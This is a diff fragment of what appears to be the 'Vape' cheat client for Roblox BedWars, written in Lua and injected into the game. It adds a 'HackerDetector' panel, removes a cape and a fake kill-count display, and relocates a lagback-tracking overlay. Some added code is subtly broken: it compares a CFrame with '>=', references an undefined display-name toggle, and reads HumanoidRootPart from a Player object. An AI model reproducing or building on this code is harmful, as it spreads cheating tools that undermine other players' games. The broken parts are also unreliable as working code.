+	HackerDetectorMainDetector.BackgroundTransparency = 0.25
+	HackerDetectorMainDetector.Position = UDim2.new(0, 0, 0, 0)
+	HackerDetectorMainDetector.Name = "MainInfo"
+	HackerDetectorMainDetector.Parent = HackerDetectorMainFrame
+	
+	local HackerDetectorName = Instance.new("TextLabel")
+	HackerDetectorName.Font = Enum.Font.SourceSans
+	HackerDetectorName.TextSize = 23
+	HackerDetectorName.BackgroundTransparency = 1
+	HackerDetectorName.TextColor3 = Color3.fromRGB(255, 255, 255)
+	HackerDetectorName.Size = UDim2.new(0, 0, 0, 0)
+	HackerDetectorName.Position = UDim2.new(0, 137, 0, 27)
+	HackerDetectorName.Text = "Name: | Reason:"
+	HackerDetectorName.Parent = HackerDetectorMainDetector
+	
+	local HackerDetectorHealthBackground = Instance.new("Frame")
+	HackerDetectorHealthBackground.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
+	HackerDetectorHealthBackground.Size = UDim2.new(0, 138, 0, 4)
+	HackerDetectorHealthBackground.Position = UDim2.new(0, 72, 0, 29)
+	HackerDetectorHealthBackground.Transparency = 10
+	HackerDetectorHealthBackground.Parent = HackerDetectorMainDetector
+	
+	local HackerDetectorHealth = Instance.new("Frame")
+	HackerDetectorHealth.Position = UDim2.new(0.000001, 0, 4.7, 0)
+	HackerDetectorHealth.Size = UDim2.new(1.8, 0, 3, 0)
+	HackerDetectorHealth.ZIndex = 3
+	HackerDetectorHealth.BorderSizePixel = 0
+	HackerDetectorHealth.BackgroundColor3 = Color3.fromRGB(40, 137, 109)
+	HackerDetectorHealth.Parent = HackerDetectorHealthBackground
+	
+	local HackerDetectorHealthExtra = Instance.new("Frame")
+	HackerDetectorHealthExtra.Size = UDim2.new(0, 0, 1, 0)
+	HackerDetectorHealthExtra.ZIndex = 4
+	HackerDetectorHealthExtra.BorderSizePixel = 0
+	HackerDetectorHealthExtra.AnchorPoint = Vector2.new(1, 0)
+	HackerDetectorHealthExtra.Position = UDim2.new(1, 0, 0, 0)
+	HackerDetectorHealthExtra.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+	HackerDetectorHealthExtra.Parent = HackerDetectorHealth
+	
+	local HackerDetectorImage = Instance.new("ImageLabel")
+	HackerDetectorImage.Size = UDim2.new(0, 56, 0, 57)
+	HackerDetectorImage.BackgroundTransparency = 1
+	HackerDetectorImage.Image = 'rbxthumb://type=AvatarHeadShot&id='..playersService.LocalPlayer.UserId..'&w=420&h=420'
+	HackerDetectorImage.Position = UDim2.new(0, 5, 0, 3)
+	HackerDetectorImage.Parent = HackerDetectorMainDetector
+	
+	local HackerDetectorFrameUICorner = Instance.new("UICorner")
+	HackerDetectorFrameUICorner.CornerRadius = UDim.new(0, 9)
+	HackerDetectorFrameUICorner.Parent = HackerDetectorMainDetector
+	
+	local HackerDetectorFrameUICorner2 = Instance.new("UICorner")
+	HackerDetectorFrameUICorner2.CornerRadius = UDim.new(0, 4)
+	HackerDetectorFrameUICorner2.Parent = HackerDetectorHealthExtra
+	
+	local TargetInfoHealthTween
+	HackerDetector.GetCustomChildren().Parent:GetPropertyChangedSignal("Size"):Connect(function()
+		HackerDetectorMainDetector.Position = UDim2.fromOffset(0, HackerDetector.GetCustomChildren().Parent.Size ~= UDim2.fromOffset(220, 0) and -5 or 40)
 	end)
 
-	local function didpingspike()
-		local currentpingcheck = pinglist[1] or math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
-		for i,v in pairs(pinglist) do 
-			if v ~= currentpingcheck and math.abs(v - currentpingcheck) >= 100 then 
-				return currentpingcheck.." => "..v.." ping"
-			else
-				currentpingcheck = v
+	shared.VapeHackerDetector = {
+		UpdateInfo = function(tab, targetsize) 
+			for _, v in pairs(shared.VapeTargetInfo.Targets) do
+					HackerDetectorImage.Image = 'rbxthumb://type=AvatarHeadShot&id='..v.Player.UserId..'&w=420&h=420'
+						HackerDetectorHealth:TweenSize(UDim2.new(math.clamp(v.Humanoid.Health / v.Humanoid.MaxHealth, 0, 2.3), 0, 2.3, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, 0.25, true)
+						HackerDetectorHealthExtra:TweenSize(UDim2.new(math.clamp((v.Humanoid.Health / v.Humanoid.MaxHealth) - 1, 0, 1), 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, 0.25, true)
+						if TargetInfoHealthTween then TargetInfoHealthTween:Cancel() end
+						local plr = game.Players.LocalPlayer
+						local chr = plr.Character
+						local hrp = chr.HumanoidRootPart
+						if not v.Player.HumanoidRootPart.CFrame >=  CFrame.new(0,1000,0) then
+						HackerDetectorName.Text = ""..(HackerDetectorDisplayName.Enabled and v.Player.DisplayName or v.Player.Name).."| Reason:"
+					end
+				break
 			end
-		end
-		return nil
-	end
+		end,
+	Targets = {},
+	Object = HackerDetector
+	}
 
-	local function notlasso()
-		for i,v in pairs(collectionService:GetTagged("LassoHooked")) do 
-			if v == lplr.Character then 
-				return false
-			end
-		end
-		return true
-	end
-	local matchstatetick = tick()
-
-	GuiLibrary.ObjectsThatCanBeSaved["GUIWindow"]["Api"].CreateCustomToggle({
-		Name = "Overlay", 
-		Icon = "vape/assets/TargetIcon1.png", 
+	HackerDetectorModule = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
+		Name = "HackerDetector",
 		Function = function(callback)
-			overlayenabled = callback
-			Overlay.SetVisible(callback) 
-			if callback then 
-				table.insert(overlayconnections, bedwars.ClientHandler:OnEvent("ProjectileImpact", function(p3)
-					if not vapeInjected then return end
-					if p3.projectile == "telepearl" then 
-						teleported[p3.shooterPlayer] = true
-					elseif p3.projectile == "swap_ball" then
-						if p3.hitEntity then 
-							teleported[p3.shooterPlayer] = true
-							local plr = playersService:GetPlayerFromCharacter(p3.hitEntity)
-							if plr then teleported[plr] = true end
-						end
-					end
-				end))
-		
-				table.insert(overlayconnections, replicatedStorageService["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].abilityUsed.OnClientEvent:Connect(function(char, ability)
-					if ability == "recall" or ability == "hatter_teleport" or ability == "spirit_assassin_teleport" or ability == "hannah_execute" then 
-						local plr = playersService:GetPlayerFromCharacter(char)
-						if plr then
-							teleportedability[plr] = tick() + (ability == "recall" and 12 or 1)
-						end
-					end
-				end))
-
-				table.insert(overlayconnections, vapeEvents.BedwarsBedBreak.Event:Connect(function(bedTable)
-					if bedTable.player.UserId == lplr.UserId then
-						bedwarsStore.statistics.beds = bedwarsStore.statistics.beds + 1
-					end
-				end))
-
-				local victorysaid = false
-				table.insert(overlayconnections, vapeEvents.MatchEndEvent.Event:Connect(function(winstuff)
-					local myTeam = bedwars.ClientStoreHandler:getState().Game.myTeam
-					if myTeam and myTeam.id == winstuff.winningTeamId or lplr.Neutral then
-						victorysaid = true
-					end
-				end))
-
-				table.insert(overlayconnections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
-					if deathTable.finalKill then
-						local killer = playersService:GetPlayerFromCharacter(deathTable.fromEntity)
-						local killed = playersService:GetPlayerFromCharacter(deathTable.entityInstance)
-						if not killed or not killer then return end
-						if killed ~= lplr and killer == lplr then 
-							bedwarsStore.statistics.kills = bedwarsStore.statistics.kills + 1
-						end
-					end
-				end))
-				
+			if callback then
+				HackerDetector.SetVisible(callback) 
 				task.spawn(function()
 					repeat
-						local ping = math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
-						if #pinglist >= 10 then 
-							table.remove(pinglist, 1)
-						end
-						table.insert(pinglist, ping)
-						task.wait(1)
-						if bedwarsStore.matchState ~= matchstatechanged then 
-							if bedwarsStore.matchState == 1 then 
-								matchstatetick = tick() + 3
-							end
-							matchstatechanged = bedwarsStore.matchState
-						end
-						if not bedwarsStore.TPString then
-							bedwarsStore.TPString = tick().."/"..bedwarsStore.statistics.kills.."/"..bedwarsStore.statistics.beds.."/"..(victorysaid and 1 or 0).."/"..(1).."/"..(0).."/"..(0).."/"..(0)
-							origtpstring = bedwarsStore.TPString
-						end
-						if entityLibrary.isAlive and (not oldcloneroot) then 
-							local newnetworkowner = isnetworkowner(entityLibrary.character.HumanoidRootPart)
-							if oldnetworkowner ~= nil and oldnetworkowner ~= newnetworkowner and newnetworkowner == false and notlasso() then 
-								local respawnflag = math.abs(lplr:GetAttribute("SpawnTime") - lplr:GetAttribute("LastTeleported")) > 3
-								if (not teleported[lplr]) and respawnflag then
-									task.delay(1, function()
-										local falseflag = didpingspike()
-										if not falseflag then 
-											bedwarsStore.statistics.lagbacks = bedwarsStore.statistics.lagbacks + 1
-										end
-									end)
-								end
-							end
-							oldnetworkowner = newnetworkowner
-						else
-							oldnetworkowner = nil
-						end
-						teleported[lplr] = nil
-						for i, v in pairs(entityLibrary.entityList) do 
-							if teleportconnections[v.Player.Name.."1"] then continue end
-							teleportconnections[v.Player.Name.."1"] = v.Player:GetAttributeChangedSignal("LastTeleported"):Connect(function()
-								if not vapeInjected then return end
-								for i = 1, 15 do 
-									task.wait(0.1)
-									if teleported[v.Player] or teleported2[v.Player] or matchstatetick > tick() or math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) < 3 or (teleportedability[v.Player] or tick() - 1) > tick() then break end
-								end
-								if v.Player ~= nil and (not v.Player.Neutral) and teleported[v.Player] == nil and teleported2[v.Player] == nil and (teleportedability[v.Player] or tick() - 1) < tick() and math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) > 3 and matchstatetick <= tick() then 
-									bedwarsStore.statistics.universalLagbacks = bedwarsStore.statistics.universalLagbacks + 1
-									vapeEvents.LagbackEvent:Fire(v.Player)
-								end
-								teleported[v.Player] = nil
-							end)
-							teleportconnections[v.Player.Name.."2"] = v.Player:GetAttributeChangedSignal("PlayerConnected"):Connect(function()
-								teleported2[v.Player] = true
-								task.delay(5, function()
-									teleported2[v.Player] = nil
-								end)
-							end)
-						end
-						local splitted = origtpstring:split("/")
-						label.Text = "Session Info\nTime Played : "..os.date("!%X",math.floor(tick() - splitted[1])).."\nKills : "..(splitted[2] + bedwarsStore.statistics.kills).."\nBeds : "..(splitted[3] + bedwarsStore.statistics.beds).."\nWins : "..(splitted[4] + (victorysaid and 1 or 0)).."\nGames : "..splitted[5].."\nLagbacks : "..(splitted[6] + bedwarsStore.statistics.lagbacks).."\nUniversal Lagbacks : "..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."\nReported : "..(splitted[8] + bedwarsStore.statistics.reported).."\nMap : "..mapname
-						local textsize = textService:GetTextSize(label.Text, label.TextSize, label.Font, Vector2.new(9e9, 9e9))
-						overlayframe.Size = UDim2.new(0, math.max(textsize.X + 19, 200), 0, (textsize.Y * 1.2) + 10)
-						bedwarsStore.TPString = splitted[1].."/"..(splitted[2] + bedwarsStore.statistics.kills).."/"..(splitted[3] + bedwarsStore.statistics.beds).."/"..(splitted[4] + (victorysaid and 1 or 0)).."/"..(splitted[5] + 1).."/"..(splitted[6] + bedwarsStore.statistics.lagbacks).."/"..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."/"..(splitted[8] + bedwarsStore.statistics.reported)
-					until not overlayenabled
+						shared.VapeHackerDetector.UpdateInfo()
+						task.wait()
+					until not vapeInjected
 				end)
 			else
-				for i, v in pairs(overlayconnections) do 
-					if v.Disconnect then pcall(function() v:Disconnect() end) continue end
-					if v.disconnect then pcall(function() v:disconnect() end) continue end
-				end
-				table.clear(overlayconnections)
+				HackerDetector.SetVisible(false) 
 			end
-		end, 
-		Priority = 2
+		end,
 	})
 end)
 
@@ -10158,77 +10114,6 @@ runcode(function()
 			Default = 10
 		})
 	end)
-	
-		runcode(function()
-			Cape = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-				Name = "Cape",
-				Function = function(callback)
-					if callback then
-						local torso = nil
-						local lplr =  game:GetService("Players").LocalPlayer
-						if lplr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
-							  if lplr.Character:FindFirstChild("Torso") then
-								torso = lplr.Character.Torso
-							  else
-								torso = lplr.Character.UpperTorso
-							  end
-							  local CapeP = Instance.new("Part")
-							  CapeP.Parent = torso.Parent
-							  CapeP.Name = "Cape"
-							  CapeP.Anchored = false
-							  CapeP.CanCollide = false
-							  CapeP.TopSurface = 0
-							  CapeP.BottomSurface = 0
-							  CapeP.Color = Color3.fromRGB(0,0,0)
-							  CapeP.FormFactor = "Custom"
-							  CapeP.Size = Vector3.new(0.2,0.2,0.2)
-							  local decal = Instance.new("Decal", CapeP)
-							  decal.Texture = "http://www.roblox.com/asset/?id=12999260012"
-							  decal.Face = "Back"
-							  local msh = Instance.new("BlockMesh", CapeP)
-							  msh.Scale = Vector3.new(9,17.6,1)
-							  local motor = Instance.new("Motor", CapeP)
-							  motor.Part0 = CapeP
-							  motor.Part1 = torso
-							  motor.MaxVelocity = 0.01
-							  motor.C0 = CFrame.new(0,2,0) * CFrame.Angles(0,math.rad(90),0)
-							  motor.C1 = CFrame.new(0,1,0.45) * CFrame.Angles(0,math.rad(90),0)
-							  local wave = false
-							  repeat wait(1/44)
-								decal.Transparency = torso.Transparency
-								local ang = 0.1
-								local oldmag = torso.Velocity.magnitude
-								local mv = 0.002
-								if wave then
-								  ang = ang + ((torso.Velocity.magnitude/10) * 0.06) + 0.06
-								  wave = false
-								else
-								  wave = true
-								end
-								ang = ang + math.min(torso.Velocity.magnitude/11, 0.5)
-								motor.MaxVelocity = math.min((torso.Velocity.magnitude/111), 0.05) + mv
-								motor.DesiredAngle = -ang
-								if motor.CurrentAngle < -0.2 and motor.DesiredAngle > -0.2  then
-								  motor.MaxVelocity = 0.05
-								end
-								repeat wait() until motor.CurrentAngle == motor.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag) >= (torso.Velocity.magnitude/10) + 1
-								if torso.Velocity.magnitude < 0.2 then
-								  wait(0.1)
-								end
-							  until not Cape.Enabled
-							end
-						else
-							if lplr.Character then
-							for i,v in pairs(lplr.Character:GetDescendants()) do
-								if v.Name == "Cape" then
-									v:Destroy()
-								end
-							end
-						end
-					end
-				end
-			})
-		end)
 		
 		runcode(function()
 			local verylessepicval =  {["Value"] = 5}
@@ -10380,8 +10265,8 @@ runcode(function()
 					game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp:GetChildren()[5].Visible = true
 					wait()
 					game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp["4"].Visible = true
-					wait()
-					game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"].HotbarHealthbarContainer.Visible = true
+                    wait()
+                    game:GetService("Players").LocalPlayer.PlayerGui.hotbar["1"].HotbarHealthbarContainer.Visible = true
 				end
 			end,
 			HoverText = "Removes useless icons/frames from your screen"
@@ -10524,18 +10409,18 @@ runcode(function()
 					["Name"] = "Chat",
 					["Function"] = function(callback)
 						if callback then
-								chat = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame
+							chat = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame
 								RunLoops:BindToHeartbeat("CustomChat", function()
-								if ChatRainbowChatBubble.Enabled then
-									game:GetService("Chat"):SetBubbleChatSettings({
-										BackgroundColor3 = Color3.fromRGB(15,15,15),
-										TextColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
-										})
-									else if not ChatRainbowChatBubble.Enabled then								
-										chat.Position = UDim2.new(0, 0, 0, 0)
+									if ChatRainbowChatBubble.Enabled then
 										game:GetService("Chat"):SetBubbleChatSettings({
-										})
-									end
+											BackgroundColor3 = Color3.fromRGB(15,15,15),
+											TextColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Hue, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Sat, GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"].Api.Value)
+										   })
+										else if not ChatRainbowChatBubble.Enabled then								
+											chat.Position = UDim2.new(0, 0, 0, 0)
+											game:GetService("Chat"):SetBubbleChatSettings({
+										   })
+										end
 									end
 									chat.Position = UDim2.new(0, ChatRightPosition["Value"], 0, ChatDownPosition["Value"])
 								end)
@@ -10592,32 +10477,6 @@ runcode(function()
 			})
 		end)
 
-	runcode(function()
-		local killsAmount =  {["Value"] = 100000}
-		local KillsCount = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "KillsCount",
-			Function = function(callback)
-				if callback then
-					RunLoops:BindToHeartbeat("killcounts", function()
-						game:GetService("Players").LocalPlayer.PlayerGui.TopBarAppGui.TopBarApp["2"]["5"].Text = "<b>"..killsAmount["Value"].."</b>"
-					end)
-				else
-					RunLoops:UnbindFromHeartbeat("killcounts")
-				end
-			end
-		})
-		killsAmount = KillsCount.CreateSlider({
-		Name = "Amount Of Kills",
-		Function = function() end,
-		Min = 1,
-		Max = 100000,
-		Default = 100000,
-	})
-end)
-
-
-
-			
 				runcode(function()
 					local logs = {["Enabled"] = false}
 					logs = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
@@ -10660,18 +10519,237 @@ end)
 						end,
 						["HoverText"] = "You need discord and a server to use it."
 					})
-					Webhook2 = logs.CreateTextBox({
-						["Name"] = "WebHook",
-						["TempText"] = "Your discord webhook",
-						["FocusLost"] = function(enter) end
-					})
-					PingUser2 = logs.CreateTextBox({
-					["Name"] = "ID",
-					["TempText"] = "UserID",
-					["FocusLost"] = function(enter) end
-				})
-			end)
+	Webhook2 = logs.CreateTextBox({
+		["Name"] = "WebHook",
+		["TempText"] = "Your discord webhook",
+		["FocusLost"] = function(enter) end
+		})
+	PingUser2 = logs.CreateTextBox({
+		["Name"] = "ID",
+		["TempText"] = "UserID",
+		["FocusLost"] = function(enter) end
+	})
+end)
 	
+runcode(function()
+	bedwarsStore.TPString = shared.vapeoverlay or nil
+	local origtpstring = bedwarsStore.TPString
+	local Overlay = GuiLibrary.CreateCustomWindow({
+		Name = "Overlay",
+		Icon = "vape/assets/TargetIcon1.png",
+		IconSize = 16
+	})
+	local overlayframe = Instance.new("Frame")
+	overlayframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	overlayframe.Size = UDim2.new(0, 200, 0, 120)
+	overlayframe.Position = UDim2.new(0, 0, 0, 5)
+	overlayframe.Parent = Overlay.GetCustomChildren()
+	local overlayframe2 = Instance.new("Frame")
+	overlayframe2.Size = UDim2.new(1, 0, 0, 10)
+	overlayframe2.Position = UDim2.new(0, 0, 0, -5)
+	overlayframe2.Parent = overlayframe
+	local overlayframe3 = Instance.new("Frame")
+	overlayframe3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	overlayframe3.Size = UDim2.new(1, 0, 0, 6)
+	overlayframe3.Position = UDim2.new(0, 0, 0, 6)
+	overlayframe3.BorderSizePixel = 0
+	overlayframe3.Parent = overlayframe2
+	local oldguiupdate = GuiLibrary.UpdateUI
+	GuiLibrary.UpdateUI = function(h, s, v, ...)
+		overlayframe2.BackgroundColor3 = Color3.fromHSV(h, s, v)
+		return oldguiupdate(h, s, v, ...)
+	end
+	local framecorner1 = Instance.new("UICorner")
+	framecorner1.CornerRadius = UDim.new(0, 5)
+	framecorner1.Parent = overlayframe
+	local framecorner2 = Instance.new("UICorner")
+	framecorner2.CornerRadius = UDim.new(0, 5)
+	framecorner2.Parent = overlayframe2
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, -7, 1, -5)
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.TextYAlignment = Enum.TextYAlignment.Top
+	label.Font = Enum.Font.GothamBold
+	label.LineHeight = 1.2
+	label.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	label.TextSize = 16
+	label.Text = ""
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.fromRGB(200, 200, 200)
+	label.Position = UDim2.new(0, 7, 0, 5)
+	label.Parent = overlayframe
+	Overlay.Bypass = true
+	local overlayconnections = {}
+	local oldnetworkowner
+	local teleported = {}
+	local teleported2 = {}
+	local teleportedability = {}
+	local teleportconnections = {}
+	local pinglist = {}
+	local fpslist = {}
+	local matchstatechanged = 0
+	local mapname = "Unknown"
+	local overlayenabled = false
+
+	task.spawn(function()
+		pcall(function()
+			mapname = workspace:WaitForChild("Map"):WaitForChild("Worlds"):GetChildren()[1].Name
+			mapname = string.gsub(string.split(mapname, "_")[2] or mapname, "-", "") or "Blank"
+		end)
+	end)
+
+	local function didpingspike()
+		local currentpingcheck = pinglist[1] or math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
+		for i,v in pairs(pinglist) do 
+			if v ~= currentpingcheck and math.abs(v - currentpingcheck) >= 100 then 
+				return currentpingcheck.." => "..v.." ping"
+			else
+				currentpingcheck = v
+			end
+		end
+		return nil
+	end
+
+	local function notlasso()
+		for i,v in pairs(collectionService:GetTagged("LassoHooked")) do 
+			if v == lplr.Character then 
+				return false
+			end
+		end
+		return true
+	end
+	local matchstatetick = tick()
+
+	GuiLibrary.ObjectsThatCanBeSaved["GUIWindow"]["Api"].CreateCustomToggle({
+		Name = "Overlay", 
+		Icon = "vape/assets/TargetIcon1.png", 
+		Function = function(callback)
+			overlayenabled = callback
+			Overlay.SetVisible(callback) 
+			if callback then 
+				table.insert(overlayconnections, bedwars.ClientHandler:OnEvent("ProjectileImpact", function(p3)
+					if not vapeInjected then return end
+					if p3.projectile == "telepearl" then 
+						teleported[p3.shooterPlayer] = true
+					elseif p3.projectile == "swap_ball" then
+						if p3.hitEntity then 
+							teleported[p3.shooterPlayer] = true
+							local plr = playersService:GetPlayerFromCharacter(p3.hitEntity)
+							if plr then teleported[plr] = true end
+						end
+					end
+				end))
+		
+				table.insert(overlayconnections, replicatedStorageService["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].abilityUsed.OnClientEvent:Connect(function(char, ability)
+					if ability == "recall" or ability == "hatter_teleport" or ability == "spirit_assassin_teleport" or ability == "hannah_execute" then 
+						local plr = playersService:GetPlayerFromCharacter(char)
+						if plr then
+							teleportedability[plr] = tick() + (ability == "recall" and 12 or 1)
+						end
+					end
+				end))
+
+				table.insert(overlayconnections, vapeEvents.BedwarsBedBreak.Event:Connect(function(bedTable)
+					if bedTable.player.UserId == lplr.UserId then
+						bedwarsStore.statistics.beds = bedwarsStore.statistics.beds + 1
+					end
+				end))
+
+				local victorysaid = false
+				table.insert(overlayconnections, vapeEvents.MatchEndEvent.Event:Connect(function(winstuff)
+					local myTeam = bedwars.ClientStoreHandler:getState().Game.myTeam
+					if myTeam and myTeam.id == winstuff.winningTeamId or lplr.Neutral then
+						victorysaid = true
+					end
+				end))
+
+				table.insert(overlayconnections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
+					if deathTable.finalKill then
+						local killer = playersService:GetPlayerFromCharacter(deathTable.fromEntity)
+						local killed = playersService:GetPlayerFromCharacter(deathTable.entityInstance)
+						if not killed or not killer then return end
+						if killed ~= lplr and killer == lplr then 
+							bedwarsStore.statistics.kills = bedwarsStore.statistics.kills + 1
+						end
+					end
+				end))
+				
+				task.spawn(function()
+					repeat
+						local ping = math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
+						if #pinglist >= 10 then 
+							table.remove(pinglist, 1)
+						end
+						table.insert(pinglist, ping)
+						task.wait(1)
+						if bedwarsStore.matchState ~= matchstatechanged then 
+							if bedwarsStore.matchState == 1 then 
+								matchstatetick = tick() + 3
+							end
+							matchstatechanged = bedwarsStore.matchState
+						end
+						if not bedwarsStore.TPString then
+							bedwarsStore.TPString = tick().."/"..bedwarsStore.statistics.kills.."/"..bedwarsStore.statistics.beds.."/"..(victorysaid and 1 or 0).."/"..(1).."/"..(0).."/"..(0).."/"..(0)
+							origtpstring = bedwarsStore.TPString
+						end
+						if entityLibrary.isAlive and (not oldcloneroot) then 
+							local newnetworkowner = isnetworkowner(entityLibrary.character.HumanoidRootPart)
+							if oldnetworkowner ~= nil and oldnetworkowner ~= newnetworkowner and newnetworkowner == false and notlasso() then 
+								local respawnflag = math.abs(lplr:GetAttribute("SpawnTime") - lplr:GetAttribute("LastTeleported")) > 3
+								if (not teleported[lplr]) and respawnflag then
+									task.delay(1, function()
+										local falseflag = didpingspike()
+										if not falseflag then 
+											bedwarsStore.statistics.lagbacks = bedwarsStore.statistics.lagbacks + 1
+										end
+									end)
+								end
+							end
+							oldnetworkowner = newnetworkowner
+						else
+							oldnetworkowner = nil
+						end
+						teleported[lplr] = nil
+						for i, v in pairs(entityLibrary.entityList) do 
+							if teleportconnections[v.Player.Name.."1"] then continue end
+							teleportconnections[v.Player.Name.."1"] = v.Player:GetAttributeChangedSignal("LastTeleported"):Connect(function()
+								if not vapeInjected then return end
+								for i = 1, 15 do 
+									task.wait(0.1)
+									if teleported[v.Player] or teleported2[v.Player] or matchstatetick > tick() or math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) < 3 or (teleportedability[v.Player] or tick() - 1) > tick() then break end
+								end
+								if v.Player ~= nil and (not v.Player.Neutral) and teleported[v.Player] == nil and teleported2[v.Player] == nil and (teleportedability[v.Player] or tick() - 1) < tick() and math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) > 3 and matchstatetick <= tick() then 
+									bedwarsStore.statistics.universalLagbacks = bedwarsStore.statistics.universalLagbacks + 1
+									vapeEvents.LagbackEvent:Fire(v.Player)
+								end
+								teleported[v.Player] = nil
+							end)
+							teleportconnections[v.Player.Name.."2"] = v.Player:GetAttributeChangedSignal("PlayerConnected"):Connect(function()
+								teleported2[v.Player] = true
+								task.delay(5, function()
+									teleported2[v.Player] = nil
+								end)
+							end)
+						end
+						local splitted = origtpstring:split("/")
+						label.Text = "Session Info\nTime Played : "..os.date("!%X",math.floor(tick() - splitted[1])).."\nKills : "..(splitted[2] + bedwarsStore.statistics.kills).."\nBeds : "..(splitted[3] + bedwarsStore.statistics.beds).."\nWins : "..(splitted[4] + (victorysaid and 1 or 0)).."\nGames : "..splitted[5].."\nLagbacks : "..(splitted[6] + bedwarsStore.statistics.lagbacks).."\nUniversal Lagbacks : "..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."\nReported : "..(splitted[8] + bedwarsStore.statistics.reported).."\nMap : "..mapname
+						local textsize = textService:GetTextSize(label.Text, label.TextSize, label.Font, Vector2.new(9e9, 9e9))
+						overlayframe.Size = UDim2.new(0, math.max(textsize.X + 19, 200), 0, (textsize.Y * 1.2) + 10)
+						bedwarsStore.TPString = splitted[1].."/"..(splitted[2] + bedwarsStore.statistics.kills).."/"..(splitted[3] + bedwarsStore.statistics.beds).."/"..(splitted[4] + (victorysaid and 1 or 0)).."/"..(splitted[5] + 1).."/"..(splitted[6] + bedwarsStore.statistics.lagbacks).."/"..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."/"..(splitted[8] + bedwarsStore.statistics.reported)
+					until not overlayenabled
+				end)
+			else
+				for i, v in pairs(overlayconnections) do 
+					if v.Disconnect then pcall(function() v:Disconnect() end) continue end
+					if v.disconnect then pcall(function() v:disconnect() end) continue end
+				end
+				table.clear(overlayconnections)
+			end
+		end, 
+		Priority = 2
+	})
+end)
+
 task.spawn(function()
 	local function createannouncement(announcetab)
 		local vapenotifframe = Instance.new("TextButton")
